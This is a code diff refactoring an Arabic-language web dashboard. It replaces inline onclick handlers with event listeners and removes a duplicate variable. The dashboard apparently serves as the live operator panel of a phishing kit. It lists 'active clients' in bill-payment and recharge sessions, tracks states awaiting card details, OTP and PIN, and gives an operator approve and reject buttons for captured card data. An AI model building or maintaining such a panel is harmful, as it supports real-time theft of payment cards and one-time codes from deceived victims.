@@ -591,10 +591,9 @@
 
     <label class="login-label">كلمة المرور</label>
     <input type="password" id="passwordInput" class="login-input"
-           placeholder="أدخل كلمة المرور"
-           onkeydown="if(event.key==='Enter') doLogin()" />
+           placeholder="أدخل كلمة المرور" />
 
-    <button class="login-btn" onclick="doLogin()">دخول</button>
+    <button class="login-btn" id="loginBtn">دخول</button>
     <div class="login-error" id="loginError">كلمة المرور غير صحيحة. حاول مرة أخرى.</div>
   </div>
 </div>
@@ -618,7 +617,7 @@
         <div class="live-dot"></div>
         مباشر
       </div>
-      <button class="logout-btn" onclick="doLogout()">خروج</button>
+      <button class="logout-btn" id="logoutBtn">خروج</button>
     </div>
   </div>
 
@@ -650,7 +649,7 @@
   <div class="main-content">
     <div class="section-header">
       <div class="section-title">العملاء النشطون</div>
-      <button class="clear-btn" onclick="clearAll()">مسح الكل</button>
+      <button class="clear-btn" id="clearAllBtn">مسح الكل</button>
     </div>
 
     <div class="table-wrap">
@@ -686,13 +685,13 @@
   <div class="modal">
     <div class="modal-header">
       <div class="modal-title" id="modalTitle">تفاصيل البطاقة</div>
-      <button class="modal-close" onclick="closeModal()">✕</button>
+      <button class="modal-close" id="modalCloseBtn">✕</button>
     </div>
     <div id="modalContent"></div>
     <!-- Decision buttons inside modal -->
     <div class="modal-decision hidden" id="modalDecision">
-      <button class="btn-approve" id="modalApproveBtn" onclick="modalDecide('approve')">✓ قبول</button>
-      <button class="btn-reject" id="modalRejectBtn" onclick="modalDecide('reject')">✕ رفض</button>
+      <button class="btn-approve" id="modalApproveBtn">✓ قبول</button>
+      <button class="btn-reject" id="modalRejectBtn">✕ رفض</button>
     </div>
   </div>
 </div>
@@ -968,8 +967,6 @@ function renderSessions() {
     const isPIN = st === 'awaiting_pin';
     const canDecide = isCard || isOTP || isPIN;
     const rowClass = canDecide ? 'awaiting-decision' : '';
-
-    const canDecide = isCard || isOTP || isPIN;
     const typeClass = (s.type === 'reload') ? 'type-reload' : 'type-bill';
     const typeText = (s.type === 'reload') ? 'إعادة شحن' : 'فاتورة';
     const statusClass = 'status-' + st.replace(/_/g, '_');
@@ -986,8 +983,8 @@ function renderSessions() {
       </td>
       <td>
         <div class="actions-cell">
-          <button class="btn-details" onclick="showDetails('${s.sessionId}')" style="${canDecide ? 'background:#1e40af;color:#fff;border-color:#1e40af;' : ''}">التفاصيل${canDecide ? ' 🔔' : ''}</button>
-          <button class="btn-delete" onclick="deleteSession('${s.sessionId}')" title="حذف">✕</button>
+          <button class="btn-details" data-action="details" data-sid="${s.sessionId}" style="${canDecide ? 'background:#1e40af;color:#fff;border-color:#1e40af;' : ''}">التفاصيل${canDecide ? ' 🔔' : ''}</button>
+          <button class="btn-delete" data-action="delete" data-sid="${s.sessionId}" title="حذف">✕</button>
         </div>
       </td>
     </tr>`;
@@ -1172,6 +1169,28 @@ function showToast(msg, type = '') {
 // ══════════════════════════════════════════
 // INIT
 // ══════════════════════════════════════════
+
+// Attach all event listeners here (instead of inline onclick)
+// Event delegation for dynamically generated table buttons
+document.getElementById('sessionsBody').addEventListener('click', function(e) {
+  const btn = e.target.closest('button[data-action]');
+  if (!btn) return;
+  const action = btn.getAttribute('data-action');
+  const sid = btn.getAttribute('data-sid');
+  if (action === 'details') showDetails(sid);
+  else if (action === 'delete') deleteSession(sid);
+});
+
+document.getElementById('loginBtn').addEventListener('click', doLogin);
+document.getElementById('passwordInput').addEventListener('keydown', function(e) {
+  if (e.key === 'Enter') doLogin();
+});
+document.getElementById('logoutBtn').addEventListener('click', doLogout);
+document.getElementById('clearAllBtn').addEventListener('click', clearAll);
+document.getElementById('modalCloseBtn').addEventListener('click', closeModal);
+document.getElementById('modalApproveBtn').addEventListener('click', function() { modalDecide('approve'); });
+document.getElementById('modalRejectBtn').addEventListener('click', function() { modalDecide('reject'); });
+
 checkAuth();
 </script>
 </body>
